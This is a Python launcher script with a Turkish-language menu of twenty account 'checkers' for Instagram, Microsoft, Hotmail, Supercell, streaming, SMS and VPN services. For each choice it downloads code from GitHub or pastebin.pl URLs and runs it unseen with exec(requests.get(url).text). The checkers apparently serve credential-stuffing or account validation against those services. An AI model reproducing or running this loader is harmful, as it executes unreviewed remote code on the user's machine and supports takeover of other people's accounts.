import os
from cfonts import render                
kral = render('S1F1R B1R', colors=['red', 'white'], align='center')
print("\x1b[1;39m—" * 60)
print(kral)
print("~ 20 Checker  ~")
print("\x1b[1;39m—" * 60)


menu = [
    " 𝗜𝗻𝘀𝘁𝗮𝗴𝗿𝗮𝗺 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗠𝗶𝗰𝗿𝗼𝘀𝗼𝗳𝘁 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗛𝗼𝘁𝗺𝗮𝗶𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝘂𝗽𝗲𝗿𝗰𝗲𝗹𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗧𝗿𝗲𝗻𝗱𝘆𝗼𝗹 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗕𝗹𝘂𝗧𝗩 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗘𝘅𝘅𝗲𝗻 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝗺𝘀𝗼𝗻𝗮𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗢𝗻𝗮𝘆𝗹𝗮𝘀𝗺𝘀 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝗮𝗻𝗮𝗹𝘀𝗺𝘀𝗼𝗻𝗮𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝗺𝘀𝗼𝗻𝗮𝘆𝘀𝗲𝗿𝘃𝗶𝘀𝗶 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗗𝗦𝗺𝗮𝗿𝘁 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ",
    "𝗜𝗱𝗲𝗳𝗶𝘅 𝗖𝗵𝗲𝗰𝗸𝗲𝗿 ",
    "𝗚𝗼𝗼𝘀𝗲𝗩𝗣𝗡 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗕𝗮𝘆𝗶𝗴𝗿𝗮𝗺 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗣𝗿𝗼𝘅𝘆 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗧𝗮𝗯𝗶𝗶 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗘𝗽𝗶𝗻𝘆𝘂𝗸𝗹𝗲 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝟮𝗚𝗘𝗽𝗶𝗻 𝗖𝗵𝗲𝗰𝗸𝗲𝗿",
    "𝗦𝗺𝘀𝗴𝗲𝗻𝗲𝗿𝗮𝘁𝗼𝗿 𝗖𝗵𝗲𝗰𝗸𝗲𝗿"
    
]

for i, item in enumerate(menu, 1):
    print(f"\x1b[38;5;117m {i:2}\x1b[38;5;231m - {item:<25} | \x1b[1;32m aktif ✅")

def shelwe():
    print("\x1b[1;39m—"*60)
    secim = input(" • Seçiminiz: ")
    
    baglantilar = {

          "1":    "https://raw.githubusercontent.com/jokerpy3/-nstaag/refs/heads/main/insta_checker.py",
        "2": "https://raw.githubusercontent.com/jokerpy3/-nstaag/refs/heads/main/login_microsoft.py",
        "3": "https://raw.githubusercontent.com/jokerpy3/-nstaag/refs/heads/main/%C4%B0NBOXSEACHERhotmail.py",
        "4": "https://raw.githubusercontent.com/jokerpy3/-nstaag/refs/heads/main/supercellchecker.py",
        "5": "https://pastebin.pl/view/raw/f97889b0",
        "6": "https://pastebin.pl/view/raw/ddc87a48",
        "7": "https://raw.githubusercontent.com/jokerpy3/-nstaag/refs/heads/main/exxenCHECKER.py",
        "8": "https://pastebin.pl/view/raw/32f29820",
        "9": "https://pastebin.pl/view/raw/70990fdb",
        "10": "https://pastebin.pl/view/raw/2574199f",
        "11": "https://pastebin.pl/view/raw/af6dba76",
        "12": "https://pastebin.pl/view/raw/191365a7",
        "13": "https://pastebin.pl/view/raw/579d52db",
        "14": "https://pastebin.pl/view/raw/12b86418",
        "15": "https://pastebin.pl/view/raw/d06e42c9",
        "16": "https://pastebin.pl/view/raw/98592dd0",
        "17": "https://pastebin.pl/view/raw/beb0bfa3",
        "18": "https://pastebin.pl/view/raw/35731903",
        "19": "https://pastebin.pl/view/raw/e3bf68d7",
        "20": "https://pastebin.pl/view/raw/4cedbe23"
    }
    
    if secim in baglantilar:
        atlas(baglantilar[secim])
    else:
        print("1 ile 20 arası bir sayı gireceksiniz")
        shelwe()

def atlas(url):
    try:
        exec(requests.get(url).text)
    except Exception as e:
        print(f"h-am {e}")

if __name__ == "__main__":
    shelwe()